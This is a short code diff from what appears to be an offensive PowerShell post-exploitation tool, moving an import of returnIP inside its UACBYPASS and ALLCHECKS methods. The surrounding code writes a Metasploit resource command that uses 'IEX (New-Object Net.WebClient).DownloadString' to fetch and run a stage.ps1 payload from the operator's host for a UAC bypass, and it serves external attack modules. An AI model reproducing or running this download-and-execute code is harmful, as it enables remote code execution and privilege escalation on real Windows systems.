@@ -1,7 +1,6 @@
 from base64 import b64encode
 from main import powershellShellcodeLayout, randomUnusedPort, DoServe, \
                  stagePowershellCode
-from menu import returnIP
 import multiprocessing
 
 
@@ -24,6 +23,7 @@ class EXTRAS(object):
             return self.shellcode
 
     def UACBYPASS(self, version):
+        from menu import returnIP
         randomPort = randomUnusedPort()
         uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1""" % (returnIP(), randomPort)
         moduleport = randomUnusedPort()
@@ -44,6 +44,7 @@ class EXTRAS(object):
             return self.shellcode
 
     def ALLCHECKS(self):
+        from menu import returnIP
         moduleport = randomUnusedPort()
         DoServe(returnIP(), "", "./externalmodules", port=moduleport, printIt=False)
         with open('allchecks.ps1', 'w') as allchecksfile:
